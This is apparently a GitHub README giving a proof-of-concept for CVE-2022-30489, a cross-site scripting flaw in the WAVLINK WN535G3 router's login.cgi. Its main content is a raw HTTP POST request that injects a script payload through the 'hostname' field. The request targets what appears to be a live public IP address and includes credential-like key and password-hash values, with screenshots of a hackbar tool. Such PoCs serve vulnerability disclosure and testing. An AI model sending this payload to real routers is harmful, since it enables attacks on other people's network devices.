# WAVLINK   WN535G3 POST XSS

# Use CVE-2022-30489

![image](https://user-images.githubusercontent.com/72059221/167049389-760be75c-6d84-45f6-a8aa-ff4e7e05241b.png)



![image](https://user-images.githubusercontent.com/72059221/167049403-82f98ff0-6774-4a6f-99f4-f712824c765b.png)



![image](https://user-images.githubusercontent.com/72059221/167049414-0eceb092-33b3-4bf6-93af-1e080c4fb314.png)


## PAYLOAD

```
POST /cgi-bin/login.cgi HTTP/1.1 Host: 98.127.66.193 Content-Length: 255 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://98.127.66.193 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://98.127.66.193/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close newUI=1&page=login&username=admin&langChange=0&ipaddr=171.113.240.243&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=")&lt;/&gt;&lt;&gt;alert(1)&lt;/&gt;&key=M27234733&password=63a36bceec2d3bba30d8611c323f4cda&lang_=cn
```



![image](https://github.com/trhacknon/XSS-CVE-2022-30489/blob/main/Screenshot_2022-05-19-01-22-15-510_com.darknethaxor.hackbar.jpg)


![image](https://github.com/trhacknon/XSS-CVE-2022-30489/blob/main/Screenshot_2022-05-19-01-26-37-769_com.darknethaxor.hackbar.jpg)



